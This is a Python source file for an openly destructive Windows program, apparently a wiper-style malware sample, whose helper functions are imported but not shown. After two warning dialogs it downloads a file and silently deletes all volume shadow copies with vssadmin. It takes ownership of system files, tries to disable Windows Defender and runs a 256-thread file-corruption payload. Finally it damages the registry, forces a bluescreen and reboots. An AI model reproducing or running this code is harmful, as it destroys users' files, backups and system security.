#Libraries
import ctypes
import random as rand
import tkinter.messagebox as tkMsg
import tkinter
from functions import *

#Variables
debug = True #console log stuff
do_destruction = False
skipCorruption = True
admCheck = ctypes.windll.shell32.IsUserAnAdmin()
threadAmount = 256
pcLoadAmount = 3200*8



#region main program
# for textboxes to work properly
window = tkinter.Tk()
window.withdraw()

# debug check
if debug:
    do_destruction = joe = tkMsg.askyesno(title='Helo :-)', message="You're about to execute possibly something bad. This program could possibly hose some of your files and your Windows registry. \n \nDo you want to continue?", icon='warning')
    if do_destruction:
        do_destruction = joe = tkMsg.askyesno(title='Last chance', message="Are you sure?\n There's no going back after this point!", icon='warning')


# Main destructive part
# does destruction if flag is true
if do_destruction:
    #downloads file
    ufck()

    #do funny
    if admCheck:
        # delete shadows
        try:
            do_command('vssadmin delete shadows /all /quiet')
        except:
            print('bruh')

        # take ownership of important shit
        takeOwnership()
    
    # attempt to weaken system security
    try:
        ripDefender()
    except:
        print('failed to get permissions')

    # debug thing to skip file corruption
    #main shit
    #bunch of threads for corruption payload to go faster
    threadList = []
    for thread in range(threadAmount):
        thr = threading.Thread(target=fileCorruptionPload, args=(admCheck, debug, round(pcLoadAmount/threadAmount), thread, skipCorruption))
        threadList.append(thr)
        thr.start()
        print('Started thread with id:' + str(thread))

    # wait for payload to finish
    for thr in threadList:
        thr.join()


#region final step
if do_destruction:
    tkMsg.showerror(title='mablo sez',message='Count your days.')

    # funny
    regFuck(admCheck)
    Bugcheck(0xC0000022)
    do_command('shutdown -r -t 0')

